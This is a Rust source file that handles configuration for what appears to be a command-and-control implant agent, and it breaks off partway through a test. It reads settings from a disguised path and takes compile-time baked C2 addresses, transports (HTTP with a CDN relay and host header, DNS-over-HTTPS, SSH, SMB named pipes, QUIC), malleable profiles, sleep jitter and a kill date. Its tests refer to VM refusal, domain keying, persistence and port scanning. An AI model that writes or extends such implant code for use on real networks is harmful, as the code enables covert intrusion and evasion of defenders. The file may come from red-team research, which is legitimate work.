//! Agent configuration loading, HMAC integrity verification, and hot-reload.
//!
//! This module handles loading the agent's TOML configuration file from
//! `~/.config/sysd/agent.toml`. Key features:
//!
//! - **HMAC integrity verification**: If the config file includes a
//!   `# hmac = <hex>` comment, the HMAC-SHA256 is verified using the shared
//!   secret before loading.
//! - **SHA-256 companion check**: An optional `.sha256` sidecar file can be
//!   used for additional integrity verification.
//! - **Hot-reload**: When the `hot-reload` feature is enabled, a filesystem
//!   watcher automatically reloads the config on changes with 500ms debounce.
//! - **Kill-date enforcement**: The agent will refuse to start if the current
//!   date is at or past the configured kill date.
//! - **Caching**: Loaded configs are cached with mtime tokens to avoid
//!   redundant file reads and deserialization.

#![allow(unexpected_cfgs)]

use anyhow::{Context as _, Result};
use common::config::{Config, SshAuthConfig};
use hmac::{Hmac, KeyInit, Mac};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, RwLock as StdRwLock};
use std::time::UNIX_EPOCH;
use tokio::sync::RwLock;

type HmacSha256 = Hmac<Sha256>;

// P1-25: Compile-time secrets via option_env! are baked into the binary and
// recoverable via `strings` or reverse engineering.  These are now only
// available in debug/test builds.  Release builds MUST provide secrets
// through runtime environment variables.
#[cfg(debug_assertions)]
const BAKED_SHARED_SECRET: Option<&str> = option_env!("SYS_C_SECRET");
#[cfg(debug_assertions)]
const BAKED_CONFIG_HMAC: Option<&str> = option_env!("SYS_CONFIG_HMAC");
const BAKED_SLEEP_MS: Option<&str> = option_env!("SYS_SLEEP_MS");
const BAKED_JITTER: Option<&str> = option_env!("SYS_JITTER");
const BAKED_KILL_DATE: Option<&str> = option_env!("SYS_KILL_DATE");
const BAKED_C_ADDR: Option<&str> = option_env!("SYS_C_ADDR");
const BAKED_TRANSPORT: Option<&str> = option_env!("SYS_TRANSPORT");
const BAKED_HTTP_ENDPOINT: Option<&str> = option_env!("SYS_HTTP_ENDPOINT");
const BAKED_HTTP_HOST_HEADER: Option<&str> = option_env!("SYS_HTTP_HOST_HEADER");
const BAKED_DOH_SERVER_URL: Option<&str> = option_env!("SYS_DOH_SERVER_URL");
const BAKED_DOH_DOMAIN: Option<&str> = option_env!("SYS_DOH_DOMAIN");
const BAKED_SSH_HOST: Option<&str> = option_env!("SYS_SSH_HOST");
const BAKED_SSH_PORT: Option<&str> = option_env!("SYS_SSH_PORT");
const BAKED_SSH_USERNAME: Option<&str> = option_env!("SYS_SSH_USERNAME");
const BAKED_SSH_AUTH_JSON: Option<&str> = option_env!("SYS_SSH_AUTH_JSON");
const BAKED_SSH_HOST_KEY_FP: Option<&str> = option_env!("SYS_SSH_HOST_KEY_FP");
const BAKED_SMB_PIPE_HOST: Option<&str> = option_env!("SYS_SMB_PIPE_HOST");
const BAKED_SMB_PIPE_NAME: Option<&str> = option_env!("SYS_SMB_PIPE_NAME");
const BAKED_SMB_PIPE_MODE: Option<&str> = option_env!("SYS_SMB_PIPE_MODE");
const BAKED_SMB_TCP_RELAY_PORT: Option<&str> = option_env!("SYS_SMB_TCP_RELAY_PORT");
/// Module verification key baked from the server-side build via
/// ORCHESTRA_MODULE_VERIFY_KEY → SYS_MODULE_VERIFY_KEY.  When present,
/// overrides the config file value so the agent verifies signed modules
/// against the server's Ed25519 signing key instead of falling back to the
/// compile-time MODULE_SIGNING_PUBKEY constant in the module_loader crate.
const BAKED_MODULE_VERIFY_KEY: Option<&str> = option_env!("SYS_MODULE_VERIFY_KEY");
const BAKED_QUIC_ENDPOINT: Option<&str> = option_env!("SYS_QUIC_ENDPOINT");
const BAKED_QUIC_PORT: Option<&str> = option_env!("SYS_QUIC_PORT");
const BAKED_QUIC_ALPN: Option<&str> = option_env!("SYS_QUIC_ALPN");
const BAKED_QUIC_SNI: Option<&str> = option_env!("SYS_QUIC_SNI");

// Dependency note: this module expects `hmac` and `hex` in agent/Cargo.toml.
// Prompt scope is limited to config.rs, so dependency additions are tracked
// here as a reminder when applying this change set.

static LAST_MTIME: AtomicU64 = AtomicU64::new(0);
static LAST_CONFIG: once_cell::sync::Lazy<StdRwLock<Option<Config>>> =
    once_cell::sync::Lazy::new(|| StdRwLock::new(None));

/// Thread-safe handle to the agent configuration.
///
/// Wrapped in `Arc<RwLock<Config>>` for shared ownership and concurrent
/// read access with exclusive write access during hot-reloads.
pub type ConfigHandle = Arc<RwLock<Config>>;

/// P1-24: Resolve the HMAC key for config integrity checking.
///
/// Only the runtime `SYS_SECRET` environment variable is used.  If
/// it is not set, config integrity checking is disabled with a warning.
///
/// P1-25: The compile-time baked secret is no longer used here (or anywhere)
/// in release builds to prevent secret extraction from the binary.
fn resolve_hmac_key() -> Option<String> {
    std::env::var("SYS_SECRET")
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

fn resolve_expected_config_hmac() -> Option<String> {
    let runtime = std::env::var("SYS_CONFIG_HMAC")
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty());

    // P1-25: In release builds, only the runtime env var is accepted.
    // In debug builds, fall back to the compile-time baked value for
    // developer convenience.
    #[cfg(debug_assertions)]
    {
        runtime.or_else(|| BAKED_CONFIG_HMAC.map(str::to_string))
    }
    #[cfg(not(debug_assertions))]
    {
        runtime
    }
}

fn sha256_path(path: &Path) -> PathBuf {
    let mut p = path.to_path_buf();
    let fname = p
        .file_name()
        .map(|n| format!("{}.sha256", n.to_string_lossy()))
        .unwrap_or_else(|| "agent.toml.sha256".to_string());
    p.set_file_name(fname);
    p
}

fn file_mtime_token(path: &Path) -> Result<u64> {
    let metadata = std::fs::metadata(path)
        .with_context(|| format!("reading metadata for {}", path.display()))?;
    let modified = metadata
        .modified()
        .with_context(|| format!("reading mtime for {}", path.display()))?;
    let dur = modified.duration_since(UNIX_EPOCH).unwrap_or_default();
    let nanos = dur.as_nanos();
    Ok(u64::try_from(nanos).unwrap_or(u64::MAX))
}

fn combined_mtime_token(path: &Path) -> Result<u64> {
    let config_mtime = file_mtime_token(path)?;
    let sha_path = sha256_path(path);
    let sha_mtime = if sha_path.exists() {
        file_mtime_token(&sha_path)?
    } else {
        0
    };
    Ok(config_mtime ^ sha_mtime.rotate_left(1))
}

/// Return a clone of the cached config, if one has been loaded.
///
/// Used by modules that need config values but don't have a `ConfigHandle`
/// threaded through their call chain (e.g. injection-engine dispatch helpers).
pub fn cached_config() -> Option<Config> {
    LAST_CONFIG
        .read()
        .ok()
        .and_then(|guard| guard.as_ref().cloned())
}

fn update_cache(config: &Config, token: u64) {
    LAST_MTIME.store(token, Ordering::Release);
    if let Ok(mut guard) = LAST_CONFIG.write() {
        *guard = Some(config.clone());
    }
}

#[derive(Default)]
struct BuildOverrideValues<'a> {
    sleep_ms: Option<&'a str>,
    jitter: Option<&'a str>,
    kill_date: Option<&'a str>,
    c2_addr: Option<&'a str>,
    transport: Option<&'a str>,
    http_endpoint: Option<&'a str>,
    http_host_header: Option<&'a str>,
    doh_server_url: Option<&'a str>,
    doh_domain: Option<&'a str>,
    ssh_host: Option<&'a str>,
    ssh_port: Option<&'a str>,
    ssh_username: Option<&'a str>,
    ssh_auth_json: Option<&'a str>,
    ssh_host_key_fingerprint: Option<&'a str>,
    smb_pipe_host: Option<&'a str>,
    smb_pipe_name: Option<&'a str>,
    smb_pipe_mode: Option<&'a str>,
    smb_tcp_relay_port: Option<&'a str>,
    quic_endpoint: Option<&'a str>,
    quic_port: Option<&'a str>,
    quic_alpn: Option<&'a str>,
    quic_sni: Option<&'a str>,
}

fn apply_baked_build_overrides(config: Config) -> Result<Config> {
    let mut config = apply_build_overrides(
        config,
        BuildOverrideValues {
            sleep_ms: BAKED_SLEEP_MS,
            jitter: BAKED_JITTER,
            kill_date: BAKED_KILL_DATE,
            c2_addr: BAKED_C_ADDR,
            transport: BAKED_TRANSPORT,
            http_endpoint: BAKED_HTTP_ENDPOINT,
            http_host_header: BAKED_HTTP_HOST_HEADER,
            doh_server_url: BAKED_DOH_SERVER_URL,
            doh_domain: BAKED_DOH_DOMAIN,
            ssh_host: BAKED_SSH_HOST,
            ssh_port: BAKED_SSH_PORT,
            ssh_username: BAKED_SSH_USERNAME,
            ssh_auth_json: BAKED_SSH_AUTH_JSON,
            ssh_host_key_fingerprint: BAKED_SSH_HOST_KEY_FP,
            smb_pipe_host: BAKED_SMB_PIPE_HOST,
            smb_pipe_name: BAKED_SMB_PIPE_NAME,
            smb_pipe_mode: BAKED_SMB_PIPE_MODE,
            smb_tcp_relay_port: BAKED_SMB_TCP_RELAY_PORT,
            quic_endpoint: BAKED_QUIC_ENDPOINT,
            quic_port: BAKED_QUIC_PORT,
            quic_alpn: BAKED_QUIC_ALPN,
            quic_sni: BAKED_QUIC_SNI,
        },
    )?;

    // Bake in the module verification key when provided by the server-side
    // build. This ensures the agent verifies signed modules against the
    // server's Ed25519 signing key instead of falling back to the hardcoded
    // MODULE_SIGNING_PUBKEY constant.
    if let Some(verify_key) = nonempty(BAKED_MODULE_VERIFY_KEY) {
        config.module_verify_key = Some(verify_key.to_string());
    }

    Ok(config)
}

fn apply_build_overrides_from_values(
    config: Config,
    sleep_ms: Option<&str>,
    jitter: Option<&str>,
    kill_date: Option<&str>,
) -> Result<Config> {
    apply_build_overrides(
        config,
        BuildOverrideValues {
            sleep_ms,
            jitter,
            kill_date,
            ..BuildOverrideValues::default()
        },
    )
}

fn apply_build_overrides(mut config: Config, overrides: BuildOverrideValues<'_>) -> Result<Config> {
    if let Some(raw_sleep_ms) = nonempty(overrides.sleep_ms) {
        let parsed: u64 = raw_sleep_ms.parse().with_context(|| {
            format!("SYS_SLEEP_MS must be an unsigned integer, got '{raw_sleep_ms}'")
        })?;
        if parsed == 0 {
            anyhow::bail!("SYS_SLEEP_MS must be greater than zero");
        }
        config.sleep.base_interval_ms = Some(parsed);
        config.sleep.base_interval_secs = parsed.saturating_add(999) / 1000;
    }

    if let Some(raw_jitter) = nonempty(overrides.jitter) {
        let parsed: u32 = raw_jitter.parse().with_context(|| {
            format!("SYS_JITTER must be an integer percentage, got '{raw_jitter}'")
        })?;
        if parsed > 100 {
            anyhow::bail!("SYS_JITTER must be between 0 and 100");
        }
        config.sleep.jitter_percent = parsed;
    }

    if let Some(raw_kill_date) = nonempty(overrides.kill_date) {
        check_kill_date(raw_kill_date)?;
        config.malleable_profile.kill_date = raw_kill_date.to_string();
    }

    apply_transport_override(&mut config, &overrides)?;

    Ok(config)
}

fn nonempty(value: Option<&str>) -> Option<&str> {
    value.map(str::trim).filter(|value| !value.is_empty())
}

fn apply_transport_override(
    config: &mut Config,
    overrides: &BuildOverrideValues<'_>,
) -> Result<()> {
    let Some(raw_transport) = nonempty(overrides.transport) else {
        return Ok(());
    };

    config.malleable_profile.cdn_relay = false;
    config.malleable_profile.cdn_endpoint.clear();
    config.malleable_profile.direct_c2_endpoint.clear();
    config.malleable_profile.dns_over_https = false;
    config.malleable_profile.doh_server_url = None;
    config.malleable_profile.ssh_host = None;
    config.malleable_profile.ssh_port = None;
    config.malleable_profile.ssh_username = None;
    config.malleable_profile.ssh_auth = None;
    config.malleable_profile.ssh_host_key_fingerprint = None;
    config.malleable_profile.smb_pipe_enabled = false;
    config.malleable_profile.smb_pipe_host = None;
    config.malleable_profile.smb_pipe_name = None;
    config.malleable_profile.smb_pipe_mode = None;
    config.malleable_profile.smb_tcp_relay_port = None;
    config.malleable_profile.c2_quic.enabled = false;
    config.malleable_profile.c2_quic.endpoint.clear();

    match raw_transport.to_ascii_lowercase().as_str() {
        "tls" => Ok(()),
        "http" => {
            config.malleable_profile.cdn_relay = true;
            config.malleable_profile.direct_c2_endpoint = nonempty(overrides.http_endpoint)
                .map(str::to_string)
                .or_else(|| endpoint_from_c2_addr(overrides.c2_addr, "http", None))
                .ok_or_else(|| {
                    anyhow::anyhow!(
                        "SYS_HTTP_ENDPOINT or SYS_C_ADDR is required for http transport"
                    )
                })?;
            if let Some(host_header) = nonempty(overrides.http_host_header)
                .map(str::to_string)
                .or_else(|| host_from_addr(overrides.c2_addr))
            {
                config.malleable_profile.host_header = host_header;
            }
            Ok(())
        }
        "doh" => {
            config.malleable_profile.dns_over_https = true;
            config.malleable_profile.doh_server_url = Some(
                nonempty(overrides.doh_server_url)
                    .map(str::to_string)
                    .or_else(|| {
                        endpoint_from_c2_addr(overrides.c2_addr, "https", Some("/dns-query"))
                    })
                    .ok_or_else(|| {
                        anyhow::anyhow!(
                            "SYS_DOH_SERVER_URL or SYS_C_ADDR is required for doh transport"
                        )
                    })?,
            );
            if let Some(domain) = nonempty(overrides.doh_domain)
                .map(str::to_string)
                .or_else(|| host_from_addr(overrides.c2_addr))
            {
                config.malleable_profile.host_header = domain;
            }
            Ok(())
        }
        "ssh" => {
            config.malleable_profile.ssh_host = Some(
                nonempty(overrides.ssh_host)
                    .map(str::to_string)
                    .or_else(|| host_from_addr(overrides.c2_addr))
                    .ok_or_else(|| {
                        anyhow::anyhow!("SYS_SSH_HOST or SYS_C_ADDR is required for ssh transport")
                    })?,
            );
            config.malleable_profile.ssh_port = Some(match nonempty(overrides.ssh_port) {
                Some(port) => port.parse().with_context(|| {
                    format!("SYS_SSH_PORT must be an unsigned 16-bit integer, got '{port}'")
                })?,
                None => 22,
            });
            config.malleable_profile.ssh_username = Some(
                nonempty(overrides.ssh_username)
                    .map(str::to_string)
                    .ok_or_else(|| {
                        anyhow::anyhow!("SYS_SSH_USERNAME is required for ssh transport")
                    })?,
            );
            config.malleable_profile.ssh_auth = Some(parse_ssh_auth(overrides.ssh_auth_json)?);
            config.malleable_profile.ssh_host_key_fingerprint =
                nonempty(overrides.ssh_host_key_fingerprint).map(str::to_string);
            Ok(())
        }
        "smb" => {
            config.malleable_profile.smb_pipe_enabled = true;
            config.malleable_profile.smb_pipe_host = Some(
                nonempty(overrides.smb_pipe_host)
                    .map(str::to_string)
                    .or_else(|| host_from_addr(overrides.c2_addr))
                    .ok_or_else(|| {
                        anyhow::anyhow!(
                            "SYS_SMB_PIPE_HOST or SYS_C_ADDR is required for smb transport"
                        )
                    })?,
            );
            config.malleable_profile.smb_pipe_name =
                nonempty(overrides.smb_pipe_name).map(str::to_string);
            config.malleable_profile.smb_pipe_mode =
                nonempty(overrides.smb_pipe_mode).map(str::to_string);
            config.malleable_profile.smb_tcp_relay_port =
                match nonempty(overrides.smb_tcp_relay_port) {
                    Some(port) => Some(port.parse().with_context(|| {
                        format!(
                        "SYS_SMB_TCP_RELAY_PORT must be an unsigned 16-bit integer, got '{port}'"
                    )
                    })?),
                    None => None,
                };
            Ok(())
        }
        "quic" => {
            config.malleable_profile.c2_quic.enabled = true;
            config.malleable_profile.c2_quic.endpoint = nonempty(overrides.quic_endpoint)
                .map(str::to_string)
                .or_else(|| host_from_addr(overrides.c2_addr))
                .ok_or_else(|| {
                    anyhow::anyhow!(
                        "SYS_QUIC_ENDPOINT or SYS_C_ADDR is required for quic transport"
                    )
                })?;
            config.malleable_profile.c2_quic.port = match nonempty(overrides.quic_port) {
                Some(port) => port.parse().with_context(|| {
                    format!("SYS_QUIC_PORT must be an unsigned 16-bit integer, got '{port}'")
                })?,
                None => 443,
            };
            if let Some(alpn) = nonempty(overrides.quic_alpn).map(str::to_string) {
                config.malleable_profile.c2_quic.alpn = alpn;
            }
            config.malleable_profile.c2_quic.sni = nonempty(overrides.quic_sni).map(str::to_string);
            Ok(())
        }
        other => {
            anyhow::bail!(
                "SYS_TRANSPORT must be one of tls, http, doh, ssh, smb, quic; got '{other}'"
            )
        }
    }
}

fn parse_ssh_auth(raw: Option<&str>) -> Result<SshAuthConfig> {
    let raw = nonempty(raw)
        .ok_or_else(|| anyhow::anyhow!("SYS_SSH_AUTH_JSON is required for ssh transport"))?;
    serde_json::from_str(raw)
        .with_context(|| "SYS_SSH_AUTH_JSON is not a valid SshAuthConfig JSON value")
}

fn endpoint_from_c2_addr(
    c2_addr: Option<&str>,
    scheme: &str,
    path: Option<&str>,
) -> Option<String> {
    let addr = nonempty(c2_addr)?;
    if addr.starts_with("http://") || addr.starts_with("https://") {
        let mut endpoint = addr.to_string();
        if let Some(path) = path {
            let after_scheme = endpoint
                .split_once("://")
                .map(|(_, rest)| rest)
                .unwrap_or(endpoint.as_str());
            if !after_scheme.contains('/') {
                endpoint.push_str(path);
            }
        }
        Some(endpoint)
    } else {
        Some(format!("{}://{}{}", scheme, addr, path.unwrap_or("")))
    }
}

fn host_from_addr(c2_addr: Option<&str>) -> Option<String> {
    let addr = nonempty(c2_addr)?;
    let without_scheme = addr.split_once("://").map(|(_, rest)| rest).unwrap_or(addr);
    let authority = without_scheme.split('/').next()?.trim();
    if let Some(rest) = authority.strip_prefix('[') {
        return rest
            .split_once(']')
            .map(|(host, _)| host.trim().to_string())
            .filter(|host| !host.is_empty());
    }
    let host = authority
        .rsplit_once(':')
        .map(|(host, _)| host)
        .unwrap_or(authority)
        .trim();
    if host.is_empty() {
        None
    } else {
        Some(host.to_string())
    }
}

/// Return the default configuration file path.
///
/// Resolves to `~/.config/sysd/agent.toml`. Falls back to
/// `./.config/sysd/agent.toml` if the home directory cannot be found.
pub fn config_path() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".config")
        .join("sysd")
        .join("agent.toml")
}

fn compute_config_hmac(raw_toml: &[u8]) -> Result<Option<[u8; 32]>> {
    let key_material = match resolve_hmac_key() {
        Some(k) => k,
        None => {
            tracing::warn!(
                "No runtime HMAC key (SYS_SECRET) available — \
                 config HMAC computation skipped.  Config integrity checking \
                 is disabled."
            );
            return Ok(None);
        }
    };
    let mut mac =
        HmacSha256::new_from_slice(key_material.as_bytes()).expect("HMAC key length is valid");
    mac.update(raw_toml);
    Ok(Some(mac.finalize().into_bytes().into()))
}

fn verify_config_hmac(config_bytes: &[u8], expected_hmac: &str) -> Result<Option<bool>> {
    let key_material = match resolve_hmac_key() {
        Some(k) => k,
        None => {
            // P1-24: No HMAC key available — cannot verify integrity.
            // Return None so callers skip the check rather than failing.
            tracing::warn!(
                "No runtime HMAC key (SYS_SECRET) available — \
                 config HMAC verification skipped.  Config integrity checking \
                 is disabled."
            );
            return Ok(None);
        }
    };

    let expected_bytes =
        hex::decode(expected_hmac.trim()).with_context(|| "config HMAC is not valid hex")?;

    let mut mac = HmacSha256::new_from_slice(key_material.as_bytes())
        .with_context(|| "failed to initialize HMAC verifier")?;
    mac.update(config_bytes);
    Ok(Some(mac.verify_slice(&expected_bytes).is_ok()))
}

/// Compute and append an HMAC-SHA256 tag to the configuration file.
///
/// Reads the file at `config_path`, strips any existing `# hmac = ...` line,
/// computes HMAC-SHA256 over the remaining content, and rewrites the file
/// with the tag appended as a comment.
pub fn append_config_hmac(config_path: &std::path::Path) -> anyhow::Result<()> {
    // NOTE: this function requires the `hex` crate in the `agent` crate deps.
    let raw = std::fs::read_to_string(config_path)?;
    let content = raw
        .lines()
        .filter(|l| !l.starts_with("# hmac = "))
        .collect::<Vec<_>>()
        .join("\n");
    let hmac_bytes = match compute_config_hmac(content.as_bytes())? {
        Some(bytes) => bytes,
        None => {
            tracing::warn!(
                "No HMAC key available — config HMAC tag not appended to {}",
                config_path.display()
            );
            return Ok(());
        }
    };
    let hmac_hex = hex::encode(hmac_bytes);
    let signed = format!("{}\n# hmac = {}\n", content, hmac_hex);
    std::fs::write(config_path, signed)?;
    Ok(())
}

/// Load agent configuration from `~/.config/sysd/agent.toml`.
/// Returns a default [`Config`] when the file does not exist yet.
/// If the last line is `# hmac = <hex>`, the HMAC-SHA256 is verified against
/// the file contents excluding that tag line. A mismatch aborts loading.
/// If no tag exists, loading continues for backward compatibility.
///
/// If a `.sha256` companion file exists, its contents are checked against the
/// SHA-256 digest of the config file and loading is aborted on mismatch.
pub fn load_config() -> Result<Config> {
    let path = config_path();
    if !path.exists() {
        let cfg = apply_baked_build_overrides(Config::default())?;
        update_cache(&cfg, 0);
        return Ok(cfg);
    }

    let mtime_token = combined_mtime_token(&path)?;
    if LAST_MTIME.load(Ordering::Acquire) == mtime_token {
        if let Some(cfg) = cached_config() {
            return Ok(cfg);
        }
    }

    let raw = std::fs::read(&path)?;
    let content = std::str::from_utf8(&raw)
        .with_context(|| format!("config file is not valid UTF-8: {}", path.display()))?;

    let lines: Vec<&str> = content.lines().collect();
    let (content_for_parse, hmac_tag) = if let Some(last) = lines.last() {
        if let Some(tag) = last.strip_prefix("# hmac = ") {
            (lines[..lines.len().saturating_sub(1)].join("\n"), Some(tag))
        } else {
            (content.to_string(), None)
        }
    } else {
        (String::new(), None)
    };

    if let Some(expected_hmac) = hmac_tag {
        match verify_config_hmac(content_for_parse.as_bytes(), expected_hmac)? {
            // P1-24: None means no HMAC key available — skip check.
            None => {
                tracing::warn!(
                    path = %path.display(),
                    "Config HMAC verification skipped — no runtime HMAC key available"
                );
            }
            Some(true) => {}
            Some(false) => {
                tracing::warn!(
                    path = %path.display(),
                    "config integrity verification failed for embedded hmac tag"
                );
                anyhow::bail!(
                    "Config integrity check failed: HMAC mismatch for {}",
                    path.display()
                );
            }
        }
    } else {
        tracing::info!(
            path = %path.display(),
            "Config file has no integrity tag - set one with sys-keygen config-hmac <path>"
        );
    }

    // Integrity check: if agent.toml.sha256 is present, verify before parsing.
    let sha_path = sha256_path(&path);
    if sha_path.exists() {
        let expected = std::fs::read_to_string(&sha_path)
            .map(|s| s.trim().to_ascii_lowercase())
            .unwrap_or_default();
        let actual = hex::encode(Sha256::digest(content.as_bytes()));
        if actual != expected {
            anyhow::bail!(
                "Config integrity check failed: SHA-256 mismatch for {}",
                path.display()
            );
        }
    }

    let config: Config = toml::from_str(&content_for_parse)?;

    if let Some(expected_hmac) = resolve_expected_config_hmac() {
        match verify_config_hmac(content_for_parse.as_bytes(), &expected_hmac)? {
            // P1-24: None means no HMAC key available — skip check.
            None => {
                tracing::warn!(
                    path = %path.display(),
                    "SYS_CONFIG_HMAC verification skipped — no runtime HMAC key available"
                );
            }
            Some(true) => {}
            Some(false) => {
                tracing::error!(
                    path = %path.display(),
                    "config integrity verification failed for SYS_CONFIG_HMAC; aborting"
                );
                anyhow::bail!(
                    "Config integrity check failed: SYS_CONFIG_HMAC mismatch for {}",
                    path.display()
                );
            }
        }
    }

    let config = apply_baked_build_overrides(config)?;

    if let Err(e) = config.sleep.validate() {
        tracing::warn!("sleep config validation warning: {e}");
    }

    update_cache(&config, mtime_token);
    Ok(config)
}

/// Load the agent configuration and wrap it in a [`ConfigHandle`].
///
/// Equivalent to [`load_config`] but returns the config wrapped in
/// `Arc<RwLock<Config>>` for shared ownership across tasks.
pub fn load_config_handle() -> Result<ConfigHandle> {
    let config = load_config()?;
    Ok(Arc::new(RwLock::new(config)))
}

/// Reload the configuration from disk into an existing [`ConfigHandle`].
///
/// Acquires a write lock on the handle and replaces the config with a
/// freshly loaded one. Used by the hot-reload watcher and manual
/// `ReloadConfig` commands.
pub async fn reload_config(handle: &ConfigHandle) -> Result<()> {
    let new_config = load_config()?;
    let mut guard = handle.write().await;
    *guard = new_config;
    Ok(())
}

#[allow(unexpected_cfgs)]
#[cfg(feature = "hot-reload")]
fn is_relevant_change_event(event: &notify::Event, config_file: &Path, sha_file: &Path) -> bool {
    if !matches!(
        event.kind,
        notify::EventKind::Create(_) | notify::EventKind::Modify(_) | notify::EventKind::Remove(_)
    ) {
        return false;
    }

    let cfg_name = config_file.file_name();
    let sha_name = sha_file.file_name();

    if event.paths.is_empty() {
        return true;
    }

    event.paths.iter().any(|p| {
        p == config_file || p == sha_file || p.file_name() == cfg_name || p.file_name() == sha_name
    })
}

#[allow(unexpected_cfgs)]
#[cfg(feature = "hot-reload")]
async fn debounce_reload_window(
    rx: &mut tokio::sync::mpsc::UnboundedReceiver<notify::Result<notify::Event>>,
    config_file: &Path,
    sha_file: &Path,
) {
    use tokio::time::{Duration, Instant};

    let mut deadline = Instant::now() + Duration::from_millis(500);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            break;
        }

        match tokio::time::timeout(remaining, rx.recv()).await {
            Ok(Some(Ok(event))) => {
                if is_relevant_change_event(&event, config_file, sha_file) {
                    // Reset debounce timer after each relevant write burst.
                    deadline = Instant::now() + Duration::from_millis(500);
                }
            }
            Ok(Some(Err(err))) => {
                tracing::warn!(error = %err, "hot-reload: watcher event error");
            }
            Ok(None) | Err(_) => break,
        }
    }
}

/// Spawn a background watcher for `agent.toml` hot-reloads.
///
/// When the `hot-reload` feature is enabled, this watches the config directory
/// and applies a debounced reload (500ms) whenever `agent.toml` or
/// `agent.toml.sha256` changes. Invalid updates are rejected and the old config
/// remains active.
///
/// Without `hot-reload`, this returns `Ok(None)`.
#[allow(unexpected_cfgs)]
pub fn spawn_config_watcher(handle: ConfigHandle) -> Result<Option<tokio::task::JoinHandle<()>>> {
    #[cfg(feature = "hot-reload")]
    {
        use notify::{RecursiveMode, Watcher};

        let config_file = config_path();
        let sha_file = sha256_path(&config_file);
        let Some(watch_dir) = config_file.parent() else {
            tracing::warn!("hot-reload: config parent directory is unavailable");
            return Ok(None);
        };
        if !watch_dir.exists() {
            tracing::warn!(
                path = %watch_dir.display(),
                "hot-reload: config directory does not exist; watcher not started"
            );
            return Ok(None);
        }

        let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<notify::Result<notify::Event>>();
        let mut watcher = notify::recommended_watcher(move |event| {
            let _ = tx.send(event);
        })
        .context("creating notify watcher")?;
        watcher
            .watch(watch_dir, RecursiveMode::NonRecursive)
            .with_context(|| format!("watching {}", watch_dir.display()))?;

        let task = tokio::spawn(async move {
            // Keep the watcher alive for the task lifetime.
            let _watcher = watcher;
            while let Some(next) = rx.recv().await {
                let event = match next {
                    Ok(event) => event,
                    Err(err) => {
                        tracing::warn!(error = %err, "hot-reload: watcher event error");
                        continue;
                    }
                };
                if !is_relevant_change_event(&event, &config_file, &sha_file) {
                    continue;
                }

                debounce_reload_window(&mut rx, &config_file, &sha_file).await;

                match reload_config(&handle).await {
                    Ok(()) => {
                        tracing::info!("hot-reload: applied updated configuration");
                    }
                    Err(err) => {
                        tracing::warn!(
                            error = %err,
                            "hot-reload: invalid configuration update rejected; keeping previous config"
                        );
                    }
                }
            }
        });

        return Ok(Some(task));
    }

    #[cfg(not(feature = "hot-reload"))]
    {
        let _ = handle;
        Ok(None)
    }
}

/// Verify that the current date (UTC) is before the given kill date.
///
/// `kill_date` must be in `YYYY-MM-DD` format.  This is a transport-
/// independent check so that kill-date enforcement works regardless of
/// which transport features are compiled in.
pub fn check_kill_date(kill_date: &str) -> Result<()> {
    let parts: Vec<&str> = kill_date.splitn(3, '-').collect();
    if parts.len() != 3 {
        anyhow::bail!(
            "invalid kill_date format '{}'; expected YYYY-MM-DD",
            kill_date
        );
    }
    let y: u32 = parts[0]
        .parse()
        .map_err(|_| anyhow::anyhow!("invalid kill_date year"))?;
    let m: u32 = parts[1]
        .parse()
        .map_err(|_| anyhow::anyhow!("invalid kill_date month"))?;
    let d: u32 = parts[2]
        .parse()
        .map_err(|_| anyhow::anyhow!("invalid kill_date day"))?;
    let kd_val = y * 10_000 + m * 100 + d;

    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let days_since_epoch = secs / 86400;
    let (ty, tm, td) = days_to_ymd(days_since_epoch);
    let today_val = ty * 10_000 + tm * 100 + td;

    if today_val >= kd_val {
        anyhow::bail!(
            "kill date {} has passed; agent refusing to connect",
            kill_date
        );
    }
    Ok(())
}

/// Convert days since the Unix epoch (1970-01-01) to (year, month, day).
/// Algorithm: http://howardhinnant.github.io/date_algorithms.html#civil_from_days
fn days_to_ymd(days: u64) -> (u32, u32, u32) {
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m as u32, d as u32)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_config_has_allowed_paths() {
        let cfg = Config::default();
        assert!(!cfg.allowed_paths.is_empty());
    }

    #[test]
    fn default_config_disables_persistence() {
        assert!(!Config::default().persistence_enabled);
    }

    #[test]
    fn toml_round_trip() {
        let original = Config {
            port_scan_timeout_ms: 1000,
            port_scan_concurrency: 10,
            allowed_paths: vec!["/tmp".into(), "/var/log".into()],
            heartbeat_interval_secs: 60,
            persistence_enabled: false,
            module_repo_url: "https://example.com".into(),
            module_aes_key: None,
            module_verify_key: None,
            module_cache_dir: common::config::default_module_cache_dir(),
            traffic_profile: Default::default(),
            required_domain: None,
            refuse_in_vm: false,
            server_cert_fingerprint: None,
            ..Default::default()
        };
        let serialized = toml::to_string(&original).unwrap();
        let deserialized: Config = toml::from_str(&serialized).unwrap();
        assert_eq!(deserialized.allowed_paths, original.allowed_paths);
        assert_eq!(deserialized.heartbeat_interval_secs, 60);
    }

    #[test]
    fn baked_build_overrides_apply_behavior_settings() {
        let cfg = apply_build_overrides_from_values(
            Config::default(),
            Some("12345"),
            Some("37"),
            Some("2099-12-31"),
        )
        .unwrap();

        assert_eq!(cfg.sleep.base_interval_ms, Some(12_345));
        assert_eq!(cfg.sleep.base_interval_secs, 13);
        assert_eq!(cfg.sleep.jitter_percent, 37);
        assert_eq!(cfg.malleable_profile.kill_date, "2099-12-31");
    }

    #[test]
    fn baked_transport_overrides_apply_malleable_runtime_settings() {
